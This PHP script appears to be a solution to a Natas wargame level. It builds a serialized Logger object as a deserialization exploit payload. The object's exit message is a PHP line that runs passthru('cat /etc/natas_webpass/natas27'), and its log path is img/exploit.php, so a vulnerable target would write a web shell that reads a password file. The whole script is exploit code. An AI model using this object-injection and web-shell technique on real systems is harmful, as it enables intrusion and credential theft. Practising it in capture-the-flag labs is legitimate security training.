<?php

class Logger{
  private $logFile;
  private $initMsg;
  private $exitMsg;

  function __construct($file){
    // initialise variables
    $this->initMsg="<?php echo 'hello world' ?>";
    $this->exitMsg="<?php passthru('cat /etc/natas_webpass/natas27') ?>";
    $this->logFile = "img/exploit.php";

    // write initial message
//    $fd=fopen($this->logFile,"a+");
//    fwrite($fd,$initMsg);
//    fclose($fd);
  }

  function log($msg){
//    $fd=fopen($this->logFile,"a+");
//    fwrite($fd,$msg."\n");
//    fclose($fd);
  }

  function __destruct(){
    // write exit message
//    $fd=fopen($this->logFile,"a+");
//    fwrite($fd,$this->exitMsg);
//    fclose($fd);
  }
}

//$encoded = 'YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjEiO3M6MjoieTEiO3M6MToiMSI7czoyOiJ4MiI7czoyOiIyMCI7czoyOiJ5MiI7czoyOiIyMCI7fX0=';
//
//$decoded = base64_decode($encoded);
//
//$temp = unserialize($decoded);
//
//for ($i = 0; $i < 300; $i++) {
//  $temp[] = $temp[0];
//}
//
//echo base64_encode(serialize($temp));

$logger = new Logger("");
var_dump($logger);

echo base64_encode(serialize($logger));
echo "\n";

?>
